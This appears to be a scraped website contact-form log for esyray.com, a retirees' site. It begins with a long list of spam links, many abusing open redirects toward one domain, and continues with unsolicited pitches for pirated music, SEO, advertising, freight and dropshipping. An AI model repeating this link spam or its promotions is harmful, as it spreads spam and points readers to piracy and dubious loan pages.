https://images.google.com.uy/url?q=https://peritoredacao.com 
http://gayko.evai.pl/268378.html 
http://jinx.in/smerko/279201.html 
http://cute.sh/japan365/52454.html 
http://gayko.evai.pl/27497.html 
https://static.wikia.nocookie.net/scream2022/images/b/b7/4845.pdf 
http://2style.net/kypko/40318.html 
http://gayko.evai.pl/104928.html 
http://mippi.jp/japaned/488791.html 
http://curl.in/franceed/188551.html 
http://www.scsa.ca/?URL=peritoredacao.com 
http://houka5.com/bookpdf/33454.pdf 
http://betty.jp/fred/54498.html 
http://heugem.evai.pl/770398.html 
http://cute.sh/japan365/66751.html 
http://bookspdf.wikidot.com/local--files/start/PS%20MANUEL%20SIERRA%20ESTUDIO%20BIBLICO%202021.PDF 
https://telegra.ph/how-to-cash-advance-uob-credit-card-02-13 
http://2style.net/grenx/26193.html 
http://081.in/mes/74181.html 
http://heugem.evai.pl/849.html 
https://sandbox.google.co.zm/url?q=https://peritoredacao.com 
https://telegra.ph/how-to-tell-if-an-online-loan-is-legit-02-12 
http://2style.net/ezyac/32357.html 
http://2style.net/krefo/26566.html 
http://heugem.evai.pl/44585.html 
http://houka5.com/pdfbook/349661.pdf 
http://slum.in/mes/170051.html 
http://2style.net/wepdua/57989.html 
http://081.in/mes/425361.html 
http://side-b.jp/japaned/444371.html 
https://images.google.ws/url?q=https://peritoredacao.com 
http://mippi.jp/japaned/280791.html 
http://2style.net/ezyac/45759.html 
http://side-b.jp/japaned/2582.html 
https://telegra.ph/which-loan-company-is-best-for-bad-credit-in-south-africa-02-13 
https://static.wikia.nocookie.net/scream2022/images/f/f8/5645.pdf 
http://2style.net/jarem/36921.html 
http://cute.sh/japan365/162501.html 
https://telegra.ph/how-can-i-make-2000-dollars-fast-02-14 
http://2style.net/eyzef/40778.html 
https://clients1.google.im/url?q=https://peritoredacao.com 
http://hybuke.evai.pl/28313.html 
http://heugem.evai.pl/115068.html 
http://panic.in/lefrance/79031.html 
http://houka5.com/pdfka/581.pdf 
http://bookspdf.wikidot.com/local--files/start/QUIEN%20ACUSAR%20A%20LOS%20ESCOGIDOS%20DE%20DIOS%20PREDICACIONES%20CRISTIANAS.PDF 
http://gayko.evai.pl/3511.html 
http://2style.net/evmybe/52997.html 
http://naive.in/lerk/52218.html 
http://2style.net/krexo/33446.html 
https://plus.google.com/url?q=https://peritoredacao.com 
http://cult.jp/fred/89521.html 
http://heugem.evai.pl/789268.html 
http://2style.net/garta/23280.html 
http://cabin.jp/fred/585081.html 
http://rapa.jp/fred/545101.html 
http://gayko.evai.pl/537398.html 
http://gayko.evai.pl/15596.html 
http://2style.net/degik/31298.html 
http://heugem.evai.pl/54693.html 
http://www.google.pl/url?q=https://peritoredacao.com 
http://hybuke.evai.pl/43460.html 
http://heugem.evai.pl/54669.html 
http://psyco.jp/japaned365/38671.html 
http://heugem.evai.pl/717968.html 
https://static.wikia.nocookie.net/scream2022/images/d/db/13023.pdf 
https://telegra.ph/27-cash-advance-reviews-02-14 
http://2style.net/garta/38483.html 
http://2style.net/gaylove/44685.html 
http://2style.net/wepdua/20449.html 
https://images.google.com.co/url?source=imgres&amp;ct=img&amp;q=https://peritoredacao.com 
http://slum.in/mes/279231.html 
http://2style.net/hmex/5507943.pdf 
http://side-b.jp/japaned/27391.html 
http://purety.jp/japaned/15234.html 
http://2style.net/grenx/1362.html 
http://gayko.evai.pl/242348.html 
http://naive.in/lerk/73201.html 
http://heugem.evai.pl/375948.html 
http://2style.net/getek/10755.html 
https://google.co.id/url?q=https://peritoredacao.com 
http://cult.jp/fred/25805.html 
http://jinx.in/smerko/4911123.pdf 
http://hybuke.evai.pl/74352.html 
http://houka5.com/pdfbook/455001.pdf 
http://bookspdf.wikidot.com/local--files/start/QURAN%20TRANSLATION%20GHAMDI%20YUNUS%2010.PDF 
http://2style.net/lefny/38620.html 
http://2style.net/utonye/21199.html 
http://heugem.evai.pl/23423.html 
http://2style.net/krexo/8527.html 
http://icecap.us/?URL=peritoredacao.com 
http://cute.sh/japan365/2489.html 
http://2style.jp/japaned/7546.html 
http://gayko.evai.pl/356798.html 
http://2style.net/acuku/27251.html 
http://hybuke.evai.pl/46385.html 
http://2style.net/gaylove/41180.html 
http://2style.net/kergo/1184645.pdf 
http://2style.net/ugbyc/34060.html 
http://2style.net/srak/27780.html 
http://opac2.mdah.state.ms.us/stone/SV85I28.php?referer=https://peritoredacao.com 
http://2style.net/lemo/19969123.pdf 
http://2style.net/getek/23815.html 
http://hybuke.evai.pl/49220.html 
http://2style.net/degik/32769.html 
http://bookspdf.wikidot.com/local--files/start/QU%20PIENSAN%20LOS%20QUE%20NO%20PIENSAN%20COMO%20YO%20VIDAS%203%200%20CANAL%20ENCUENTRO%20HD.PDF 
http://gayko.evai.pl/11733.html 
https://telegra.ph/HOW-TO-GET-A-CAR-LOAN-FAST-02-12 
http://heugem.evai.pl/274698.html 
http://gayko.evai.pl/53683.html 
http://zuffa.us/__media__/js/netsoltrademark.php?d=https://peritoredacao.com 
http://2style.jp/japaned/14480.html 
http://2style.net/gaylove/27461.html 
http://heugem.evai.pl/564448.html 
http://heugem.evai.pl/70704.html 
http://psyco.jp/japaned365/58038.html 
http://gayko.evai.pl/2757.html 
http://hybuke.evai.pl/28580.html 
http://heugem.evai.pl/22652.html 
http://2style.net/acuku/13152.html 
https://clients1.google.ht/url?q=https://peritoredacao.com 
http://hybuke.evai.pl/52515.html 
http://2style.net/hrapi/47294.html 
http://2style.net/virko/5461043.pdf 
http://hybuke.evai.pl/71536.html 
http://heugem.evai.pl/146318.html 
http://gayko.evai.pl/44757.html 
http://muu.in/gnas/391.html 
http://side-b.jp/japaned/49392.html 
http://2style.net/ledo/44339.html 
https://lincolnsu.com/?URL=peritoredacao.com 
http://mist.in/sradmy/143511.html 
https://telegra.ph/LOAN-RECEIVABLE-IN-CASH-FLOW-STATEMENT-02-15 
http://2style.net/ugbyc/46525.html 
http://purety.jp/japaned/146421.html 
http://2style.net/hrapi/22983.html 
http://cult.jp/fred/87931.html 
http://2style.net/kermo/57983.html 
http://slum.in/mes/374241.html 
http://slum.in/mes/25847.html 
http://www.interyellow.com/url.php?url=https://peritoredacao.com 
http://mippi.jp/japaned/361531.html 
http://2style.net/gwuzn/2107.html 
https://telegra.ph/how-to-send-money-to-gcash-02-14 
http://2style.net/uhyku/2530.html 
http://bookspdf.wikidot.com/local--files/start/QU%20HA%20SIDO%20DE%20LOS%20CONCURSANTES%20DE%20OT%202021%20DESDE%20QUE%20ABANDONARON%20LA%20ACADEMIA.PDF 
http://mippi.jp/japaned/28418.html 
http://mippi.jp/japaned/574331.html 
http://2style.net/degik/45480.html 
http://cute.sh/japan365/5254.html 
http://a-bcd.ru/?goto=jump&amp;url=www.peritoredacao.com 
http://2style.net/grenx/47699.html 
http://mist.in/sradmy/372611.html 
http://2style.net/pefo/17531.html 
http://2style.net/gwuzn/46250.html 
http://heugem.evai.pl/505928.html 
https://telegra.ph/how-to-borrow-money-from-gtb-using-ussd-code-02-13 
http://muu.in/gnas/34663.html 
http://heugem.evai.pl/386038.html 
http://2style.net/uzyaw/54476.html 
https://ipv4.google.com.qa/url?q=https://peritoredacao.com
+++ 2022-02-21 07:25:33 PM -- Email from: DJSicarioFette, -- subject: FTP service is a community for DJs, -- email: suzannebaier@tele2.nl, -- Message is: Hi, 
 
Fans that helps you gain full access to exclusive electronic. https://0daymusic.org 
https://0daymusic.org/premium.php 
 
Best regards, DJSicario
+++ 2022-02-22 06:54:48 AM -- Email from: Jeffrey Earhart, -- subject: Gerald Arabian, -- email: AricaMarcelin@gmail.com, -- Message is: Good job on the new site! Now go ahead and submit it to our free directory here https://1mdr.short.gy/submityourwebsite
+++ 2022-02-22 06:47:39 PM -- Email from: Jenny Ashford, -- subject: The Best Ad Network for Affiliates &amp; Advertisers in 2022, -- email: jenny@foremedia.net, -- Message is: Do you advertise on Google / Facebook / Native? You are leaving money on the table!

Hey, my name is Jenny from ForeMedia.net, I saw your site and noticed that while It looks great, you could use a little bit more traffic you drive more visitors &amp; conversions...

Luckily for you, I can help you with that!

I can get you tens of thousands of visitors from pretty much every country on the globe, for 10-15% of the cost you would normally pay on Google or Facebook and the traffic is of a much higher quality because your ads will be placed on high quality sites we work with directly...

Sounds good? You can reply to this email:  jenny.sa@foremedia.net
Or visit our self-serve platform here: https://go.foremedia.net/u/v/

We also have Live chat with English speaking agents willing to help you start and optimize your ads for maximum traffic, give it a try here:

https://go.foremedia.net/u/v/
+++ 2022-02-22 10:58:47 PM -- Email from: Mike Scott, -- subject: cheap monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Good Day 
 
I have just verified your SEO on  esyray.com for the ranking keywords and saw that your website could use an upgrade. 
 
We will improve your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our pricelist here, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
 
regards 
Mike Scott
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2022-02-22 11:56:35 PM -- Email from: Nova Pallon, -- subject: Have a question for you, -- email: napinternationql@gmail.com, -- Message is: Hello 
My name is Nova and I just wanted to see if we could schedule a quick call. 
 
We provide imprinted products that you can put your logo on. Things like: coffee mugs, hats, t-shirts, pens and thousands of other products. 
 
I am not sure if you ever tried using imprinted products, but they are a very powerful marketing tool. They help keep your name in-front of prospects and clients for a lifetime, so that when they need your type of products or services, your company is top-of-mind. 
 
This Weeks Promotion For New Clients: 
 
We are offering a 20% discount on all our imprinted products. 
 
I would love to connect with you and work something out within your budget, are you available for a quick chat in the next day or so? You can book a time with me here: https://calendly.com/novapallon27 
Sincerely, 
 
Nova Pallon 
Business Development 
NAP (nice ass promos)
+++ 2022-02-23 01:08:57 PM -- Email from: Melisa Bruni, -- subject: Inquiry esyray.com, -- email: pmtaking@163.com, -- Message is: Inquiry, Do you have any shippment from China?

Hi  esyray.com

We are the Top 100 freight forwarder in China,We can handle the shipment from Shenzhen, Guangzhou,Xiamen, Shanghai, Ningbo, Qingdao and so on.
 
 Here below is our main services:
1. Air freight&amp;Ocean freight forwarding
2. FBA shipping
3. Consolidation,Warehousing
4. Customs broker
5. Insurance
6. DDU&amp;DDP

some price for your reference:
China ports to the LA/West ports in the USA  :USD8000-11000/40HQ
China ports to the NY/East ports in the USA: USD9000-14000/40HQ
China ports to Australia Ports: USD5000-7000/40HQ
China ports to Europe Ports:USD8500-12500/40HQ
China ports to Latin America: USD8000-12000/40HQ

Air freight from China to USA&amp;Canada :+500kgs USD5.55-6.85/kgs
Air freight from China to Europe (UK,Germany and so on):+500kgs USD3.2-4.2/kgs

Would you like tell me which is your depart ports in China and which is your destination ports?We will offer the best price for you.


Thanks&amp;Best Regards,

Kroes     
pmtaking@163.com

-------------------------------------------
esyray.com
https://esyray.com/
E-Systems/Raytheon Garland Retirees
+++ 2022-02-23 03:16:24 PM -- Email from: Michelle Lindsay, -- subject: Would you like a new business in addition to your existing one?, -- email: dsi_1@lavache.com, -- Message is: Hi,

I thought you may be interested.
 
We supply the best niche dropshipping stores out there.
You keep all of the profit. We are the designers this is all we do.

Free hosting, domain and social media marketing materials included.
Just a one time fee for your dropship store and thats it.

If this sounds of interest please see our available sites at https://dropshippingincome.com

Thank you for your time and hope to see you there.

Best,
Michelle L.
DSI
